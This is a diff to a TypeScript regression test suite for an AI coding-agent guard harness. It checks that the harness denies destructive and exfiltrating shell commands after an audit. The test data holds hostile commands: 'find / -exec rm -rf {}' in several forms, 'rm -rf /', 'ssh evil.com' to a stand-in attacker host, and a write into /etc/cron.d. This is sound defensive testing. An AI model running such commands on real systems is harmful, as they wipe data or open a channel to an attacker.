@@ -1,7 +1,9 @@
 /**
  * `test/audit-20261018-remediation.test.ts` — Regression suite for every
- * finding in `AUDIT_REPORT_FINDINGS.md` (audit date 2026-10-18, package
- * `1.0.9` → `1.0.10` remediation branch).
+ * finding in `AUDIT_REPORT_FINDINGS.md` (audit date 2026-10-18; follow-up
+ * remediation round: `1.0.10` → `1.0.11` for the find-exec placeholder,
+ * guard-root, lesson-per-read, taint-fork, and post-formatter built-in-leg
+ * findings).
  *
  * Each `describe` block names the finding ID it pins so a reintroduced
  * defect goes RED under the exact finding key:
@@ -12,7 +14,7 @@
  * - OH-6.7-edit-breaker-unreachable (P1, unit + adapter pipeline)
  * - OH-8.2-install-story (P2), OH-scope-loc-budget (P2)
  * - OH-4.2-post-formatter-receipt (P2, built-in edit receipt vs disk)
- * - OH-1.3-stale-npm-latest (P0, version bump to 1.0.10)
+ * - OH-1.3-stale-npm-latest (P0, version bump to 1.0.11)
  */
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
@@ -21,13 +23,20 @@ import { join, resolve } from "node:path";
 import { spawnSync } from "node:child_process";
 import {
   clearAllSessionAttempts,
+  clearPendingLessonProposals,
+  clearSessionLineage,
   defaultGuardConfig,
   evaluateBoardGuard,
   evaluateSession,
+  getPendingLessonProposals,
+  getSessionForkSource,
+  linkForkLineageFromEventMetadata,
   recordAndEvaluateCircuitBreaker,
+  recordSessionForkLink,
   recordToolAttempt,
   registerContextBudgetHook,
   resetSessionAttempts,
+  resolveHarnessOptions,
   shellAllFileTargets,
   shellTargetEscapesWorkspace,
   toTrippedDirective,
@@ -36,6 +45,7 @@ import {
 } from "../src/index";
 import {
   classifyShellCommand,
+  findExecPayloads,
   isDestructiveShellCommand,
   shellArgvFileTargets,
 } from "../src/guards/shell-parse";
@@ -59,6 +69,8 @@ function makeTempDir(prefix: string): string {
 beforeEach(() => {
   clearAllSessionAttempts();
   clearTaintState();
+  clearPendingLessonProposals();
+  clearSessionLineage();
 });
 
 afterEach(() => {
@@ -67,6 +79,8 @@ afterEach(() => {
   }
   clearAllSessionAttempts();
   clearTaintState();
+  clearPendingLessonProposals();
+  clearSessionLineage();
 });
 
 describe("OH-6.5-wrapper-laundering: every prefix wrapper denies rm -rf /", () => {
@@ -678,15 +692,423 @@ describe("OH-4.2-post-formatter-receipt: built-in edit receipt reflects post-for
   });
 });
 
-describe("OH-1.3-stale-npm-latest: release carries the P0 fixes at 1.0.10", () => {
+describe("OH-1.3-stale-npm-latest: release carries the P0 fixes at 1.0.11", () => {
   test("package.json, src/version.ts, and the entrypoint agree past the stale 1.0.9", () => {
     expect(HARNESS_RELEASE_VERSION).toBe(pkgJson.version);
-    expect(HARNESS_RELEASE_VERSION).toBe("1.0.10");
+    expect(HARNESS_RELEASE_VERSION).toBe("1.0.11");
     expect(HARNESS_RELEASE_VERSION).not.toBe("1.0.9");
+    expect(HARNESS_RELEASE_VERSION).not.toBe("1.0.10");
   });
 
   test("README title tracks the release version", () => {
     const readme = readFileSync(resolve("README.md"), "utf8");
     expect(readme).toContain(`(\`v${pkgJson.version}\`)`);
+  });
+});
+
+describe("OH-6.5-find-exec-placeholder: {} placeholder wipe laundering", () => {
+  test("findExecPayloads unwraps -exec/-execdir/-ok/-okdir payloads verbatim", () => {
+    expect(findExecPayloads(["/", "-exec", "rm", "-rf", "{}", ";"])).toEqual([
+      "rm -rf {}",
+    ]);
+    expect(findExecPayloads(["/", "-execdir", "rm", "-rf", "{}", "+"])).toEqual([
+      "rm -rf {}",
+    ]);
+    expect(findExecPayloads(["/", "-ok", "rm", "-rf", "{}", ";"])).toEqual([
+      "rm -rf {}",
+    ]);
+    expect(findExecPayloads(["/", "-okdir", "rm", "-rf", "{}", ";"])).toEqual([
+      "rm -rf {}",
+    ]);
+  });
+
+  test("terminator x starter matrix over a wipe root is destructive", () => {
+    for (const starter of ["-exec", "-execdir", "-ok", "-okdir"]) {
+      for (const terminator of ["\\;", "+"]) {
+        const command = `find / ${starter} rm -rf {} ${terminator}`;
+        expect(classifyShellCommand(command).class).toBe("destructive");
+        expect(isDestructiveShellCommand(command)).toBe(true);
+      }
+    }
+  });
+
+  test("wipe roots deny; scoped roots stay write-class", () => {
+    for (const root of ["/", "~", "$HOME", "${HOME}", "/*"]) {
+      const command = `find ${root} -exec rm -rf {} \\;`;
+      expect(isDestructiveShellCommand(command)).toBe(true);
+    }
+    for (const command of [
+      "find /tmp -name x -exec rm -rf {} \\;",
+      "find /tmp -name x -exec rm -rf {} +",
+      "find . -exec rm -rf {} \\;",
+      "find /tmp/x -okdir rm -rf {} \\;",
+    ]) {
+      expect(classifyShellCommand(command).class).toBe("write");
+      expect(isDestructiveShellCommand(command)).toBe(false);
+    }
+  });
+
+  test("builder/architect/director/qa verdicts deny with rule-1-destructive", () => {
+    const command = "find / -exec rm -rf {} \\;";
+    for (const role of [
+      "builder",
+      "architect",
+      "director",
+      "manager",
+      "qa-adversary",
+      "agency-qa",
+    ]) {
+      const verdict = evaluateBoardGuard({ role, tool: "shell", command });
+      expect(verdict.allowed).toBe(false);
+      expect(verdict.rule).toBe("rule-1-destructive");
+    }
+  });
+
+  test("preserved taxonomy: scoped delete allows; literal wipe payload still denies", () => {
+    expect(classifyShellCommand("find /tmp -name x -delete").class).toBe("write");
+    expect(
+      evaluateBoardGuard({
+        role: "builder",
+        tool: "shell",
+        command: "find /tmp -name x -delete",
+      }).allowed,
+    ).toBe(true);
+    expect(isDestructiveShellCommand("find /tmp -exec rm -rf / \\;")).toBe(true);
+    const scoped = "find /tmp -name x -exec rm -rf {} \\;";
+    expect(
+      evaluateBoardGuard({ role: "builder", tool: "shell", command: scoped }).allowed,
+    ).toBe(true);
+    expect(
+      evaluateBoardGuard({ role: "architect", tool: "shell", command: scoped })
+        .allowed,
+    ).toBe(true);
+  });
+
+  test("tainted session: placeholder wipe denies at both layers (allow-to-deny)", () => {
+    const session = `oh65-find-taint-${Date.now()}`;
+    const command = "find / -exec rm -rf {} \\;";
+    recordUntrustedContentTaint(session, "webfetch");
+    const tainted = evaluateTaintGuard(session, command, "shell");
+    expect(tainted.action).toBe("deny");
+    expect(tainted.ruleId).toBe("TAINT-DESTRUCTIVE-1");
+    expect(evaluateTaintGuard(session, "rm -rf /", "shell").action).toBe("deny");
+    expect(
+      evaluateBoardGuard({ role: "builder", tool: "shell", command }).allowed,
+    ).toBe(false);
+    clearTaintState(session);
+    expect(evaluateTaintGuard(session, command, "shell").action).toBe("allow");
+    expect(
+      evaluateTaintGuard(session, "find /tmp -name x -exec rm -rf {} \\;", "shell")
+        .action,
+    ).toBe("allow");
+  });
+});
+
+describe("OH-6.5-guard-root-unwired: custom guardConfig defaults workspaceRoot to rootDir", () => {
+  test("omitted workspaceRoot defaults to rootDir, not process.cwd()", () => {
+    const resolved = resolveHarnessOptions({
+      rootDir: "/repo/proj",
+      guardConfig: { lockedContractGlobs: ["**/contracts/**"] },
+    });
+    expect(resolved.rootDir).toBe("/repo/proj");
+    expect(resolved.guardConfig.workspaceRoot).toBe("/repo/proj");
+  });
+
+  test("explicit workspaceRoot wins over rootDir", () => {
+    const resolved = resolveHarnessOptions({
+      rootDir: "/repo/proj",
+      guardConfig: { lockedContractGlobs: [], workspaceRoot: "/explicit/root" },
+    });
+    expect(resolved.guardConfig.workspaceRoot).toBe("/explicit/root");
+  });
+
+  test("blank workspaceRoot normalizes back to rootDir (fail-closed)", () => {
+    const resolved = resolveHarnessOptions({
+      rootDir: "/repo/proj",
+      guardConfig: { lockedContractGlobs: [], workspaceRoot: "   " },
+    });
+    expect(resolved.guardConfig.workspaceRoot).toBe("/repo/proj");
+  });
+
+  test("workspace-relative writes allow under the defaulted root; escapes still deny", () => {
+    const root = makeTempDir("oh65-root-");
+    const resolved = resolveHarnessOptions({
+      rootDir: root,
+      guardConfig: { lockedContractGlobs: [] },
+    });
+    expect(
+      evaluateBoardGuard(
+        { role: "builder", tool: "shell", command: "echo hi > out.txt" },
+        resolved.guardConfig,
+      ).allowed,
+    ).toBe(true);
+    const escape = evaluateBoardGuard(
+      { role: "builder", tool: "shell", command: "echo hi > /etc/cron.d/evil" },
+      resolved.guardConfig,
+    );
+    expect(escape.allowed).toBe(false);
+    expect(escape.rule).toBe("rule-0-shell-target-containment");
+  });
+});
+
+describe("OH-6.7-lesson-per-read: exactly one pending proposal per doom-loop", () => {
+  test("pipeline: read-ok, edit-fail, read-ok, edit-fail, good-edit-ok yields 1 lesson on the edit", async () => {
+    const root = makeTempDir("oh67-lesson-");
+    const target = join(root, "loop.ts");
+    writeFileSync(target, "export const x = 1;\n", "utf8");
+    const host = makeAdapterHost(root);
+    wireOpenCodeV2PromiseContext({
+      ctx: host.ctx,
+      workspaceRoot: root,
+      tools: {},
+      evaluatePermission: (req) => evaluateBoardGuard(req, defaultGuardConfig()),
+      recordCircuitBreaker: (ev) => toTrippedDirective(recordAndEvaluateCircuitBreaker(ev)),
+      runContextBudget: () => undefined,
+    });
+    const after = host.toolAfter[0];
+    const sessionId = `oh67-lesson-${Date.now()}`;
+    const okRead = {
+      sessionID: sessionId,
+      agent: "build",
+      tool: "read",
+      input: { filePath: target },
+      status: "completed",
+      result: { content: [{ type: "text", text: "export const x = 1;" }] },
+    };
+    const failEdit = {
+      sessionID: sessionId,
+      agent: "build",
+      tool: "edit",
+      input: { filePath: target },
+      status: "error",
+      error: { message: "anchor mismatch" },
+    };
+    // Pre-trip cycle: read-ok -> edit-fail -> read-ok -> edit-fail.
+    // The second edit-fail establishes the trip; the earlier re-reads run
+    // BEFORE the trip and must propose nothing.
+    await after(okRead as never);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    await after(failEdit as never);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    await after(okRead as never);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    await after(failEdit as never);
+    expect(evaluateSession(sessionId).triggered).toBe(true);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    // Post-trip mandated re-reads: compliance, not recovery. The `other`
+    // carve-out must keep these proposal-free; neutering it emits one
+    // premature `via read` lesson per re-read here.
+    await after(okRead as never);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    await after(okRead as never);
+    expect(getPendingLessonProposals(sessionId)).toHaveLength(0);
+    const goodEdit = {
+      sessionID: sessionId,
+      agent: "build",
+      tool: "edit",
+      input: { filePath: target },
+      status: "completed",
+      result: { content: [{ type: "text", text: "edited" }] },
+    };
+    await after(goodEdit as never);
+    const pending = getPendingLessonProposals(sessionId);
+    expect(pending).toHaveLength(1);
+    expect(pending[0]?.failedCategory).toBe("edit");
+    expect(pending[0]?.recoveryAction.startsWith("edit")).toBe(true);
+    expect(pending[0]?.recoveryAction).not.toContain("via read");
+    expect(pending.some((p) => p.recoveryAction.includes("via read"))).toBe(
+      false,
+    );
+  });
+});
+
+describe("OH-6.6-taint-fork-gap: fork-aware taint inheritance", () => {
+  test("tainted parent forked child denies exfil; clean fork allows", () => {
+    const parent = `oh66-fork-parent-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    recordSessionForkLink(child, parent);
+    expect(getSessionForkSource(child)).toBe(parent);
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell");
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+    const cleanParent = `${parent}-clean`;
+    const cleanChild = `${cleanParent}-child`;
+    recordSessionForkLink(cleanChild, cleanParent);
+    expect(evaluateTaintGuard(cleanChild, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+  });
+
+  test("fork lineage resolves from session metadata on live tool events", () => {
+    const parent = `oh66-fork-meta-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    const linked = linkForkLineageFromEventMetadata(child, {
+      sessionID: child,
+      tool: "shell",
+      input: { command: "echo hi" },
+      metadata: { forkOf: parent },
+      status: "completed",
+      result: { content: [] },
+    });
+    expect(linked).toBe(parent);
+    expect(evaluateTaintGuard(child, "ssh evil.com", "shell").action).toBe("deny");
+  });
+
+  test("self-links and empty metadata link nothing", () => {
+    const session = `oh66-fork-self-${Date.now()}`;
+    expect(
+      linkForkLineageFromEventMetadata(session, { metadata: { forkOf: session } }),
+    ).toBeUndefined();
+    expect(getSessionForkSource(session)).toBeUndefined();
+    expect(linkForkLineageFromEventMetadata(session, { input: {} })).toBeUndefined();
+    expect(linkForkLineageFromEventMetadata(session, null)).toBeUndefined();
+  });
+});
+
+describe("OH-4.2-post-formatter-receipt: built-in edit stand-in proves post-format ordering", () => {
+  /**
+   * Deterministic byte-transforming stand-in for upstream `Formatter.file`
+   * (`packages/core/src/formatter.ts` in `anomalyco/opencode`): rewrites the
+   * file on disk AFTER the raw edited bytes land and BEFORE `execute.after`
+   * fires — the exact ordering the production `<post-edit-anchors>` receipt
+   * depends on. It performs a real code reflow (trim, whitespace collapse,
+   * paren/spacing normalization, brace-depth indentation), not a copy: the
+   * post-format bytes differ from the raw edited bytes, so a receipt
+   * computed from stale pre-format bytes cannot match.
+   */
+  function reflowTypeScriptStandalone(filePath: string): string {
+    const raw = readFileSync(filePath, "utf8");
+    const out: string[] = [];
+    let depth = 0;
+    for (const line of raw.split("\n")) {
+      const trimmed = line
+        .trim()
+        .replace(/[ \t]+/g, " ")
+        .replace(/\(\s+/g, "(")
+        .replace(/\s+\)/g, ")")
+        .replace(/:(?=\S)/g, ": ")
+        .replace(/,(?=\S)/g, ", ")
+        .replace(/\)\s*\{/g, ") {");
+      if (trimmed === "") {
+        continue;
+      }
+      if (/^\}/.test(trimmed)) {
+        depth = Math.max(0, depth - 1);
+      }
+      out.push(`${"  ".repeat(depth)}${trimmed}`);
+      if (/\{$/.test(trimmed)) {
+        depth += 1;
+      }
+    }
+    const formatted = `${out.join("\n")}\n`;
+    writeFileSync(filePath, formatted, "utf8");
+    return formatted;
+  }
+
+  /**
+   * Built-in `edit` stand-in: drives the REAL adapter hooks in true upstream
+   * order — `execute.before` (input repair), disk write of the raw edited
+   * bytes (like `FileMutation.write`), the on-disk format pass (like
+   * `Formatter.file`), a disk re-read (like `FileMutation.syncTextBom`),
+   * then `execute.after` (receipt computed from the re-read bytes).
+   */
+  async function runBuiltInEditStandIn(params: {
+    before: Array<(ev: never) => void | Promise<void>>;
+    after: Array<(ev: never) => void | Promise<void>>;
+    sessionId: string;
+    filePath: string;
+    oldString: string;
+    newString: string;
+  }): Promise<{ formattedOnDisk: string; outputText: string }> {
+    const { before, after, sessionId, filePath, oldString, newString } = params;
+    const input = { filePath, oldString, newString };
+    for (const hook of before) {
+      await hook({
+        sessionID: sessionId,
+        agent: "build",
+        tool: "edit",
+        input,
+      } as never);
+    }
+    const current = readFileSync(filePath, "utf8");
+    if (!current.includes(oldString)) {
+      throw new Error(`stand-in: oldString not found in ${filePath} (fail-closed)`);
+    }
+    if (current.indexOf(oldString) !== current.lastIndexOf(oldString)) {
+      throw new Error(
+        `stand-in: oldString is ambiguous in ${filePath} (fail-closed)`,
+      );
+    }
+    writeFileSync(filePath, current.replace(oldString, newString), "utf8");
+    const formattedOnDisk = reflowTypeScriptStandalone(filePath);
+    const completed = {
+      sessionID: sessionId,
+      agent: "build",
+      tool: "edit",
+      input,
+      status: "completed",
+      result: { content: [{ type: "text", text: "Edited" }] },
+    };
+    for (const hook of after) {
+      await hook(completed as never);
+    }
+    const outputText = (completed.result.content as Array<{ text: string }>)
+      .map((c) => c.text)
+      .join("\n");
+    return { formattedOnDisk, outputText };
+  }
+
+  test("unformatted TS edit through the built-in sequence receipts post-format bytes only", async () => {
+    const root = makeTempDir("oh42-builtin-");
+    const target = join(root, "widget.ts");
+    const beforeContent = [
+      "export function  renderCard( title:string  )  {",
+      "return  title;",
+      "}",
+    ].join("\n");
+    writeFileSync(target, `${beforeContent}\n`, "utf8");
+    const host = makeAdapterHost(root);
+    wireOpenCodeV2PromiseContext({
+      ctx: host.ctx,
+      workspaceRoot: root,
+      tools: {},
+      evaluatePermission: (req) => evaluateBoardGuard(req, defaultGuardConfig()),
+      recordCircuitBreaker: (ev) => toTrippedDirective(recordAndEvaluateCircuitBreaker(ev)),
+      runContextBudget: () => undefined,
+    });
+    const sessionId = `oh42-builtin-${Date.now()}`;
+    const { formattedOnDisk, outputText } = await runBuiltInEditStandIn({
+      before: host.toolBefore,
+      after: host.toolAfter,
+      sessionId,
+      filePath: target,
+      oldString: "return  title;",
+      newString: "return  title.trim();",
+    });
+    // The format pass genuinely rewrote the bytes on disk.
+    const expectedFormatted = [
+      "export function renderCard(title: string) {",
+      "  return title.trim();",
+      "}",
+    ].join("\n");
+    expect(formattedOnDisk).toBe(`${expectedFormatted}\n`);
+    expect(readFileSync(target, "utf8")).toBe(`${expectedFormatted}\n`);
+    // The receipt reflects the post-format bytes: every formatted line hash
+    // is present, and no stale pre-format line hash leaks in (ordering proof:
+    // a receipt computed from bytes read before formatting would carry the
+    // unformatted line hashes instead).
+    expect(outputText).toContain("<post-edit-anchors");
+    for (const line of expectedFormatted.split("\n")) {
+      expect(outputText).toContain(`${computeLineHash(line)}| ${line}`);
+    }
+    for (const stale of [
+      "export function  renderCard( title:string  )  {",
+      "return  title;",
+      "return  title.trim();",
+    ]) {
+      expect(outputText).not.toContain(`${computeLineHash(stale)}| ${stale}`);
+    }
   });
 });
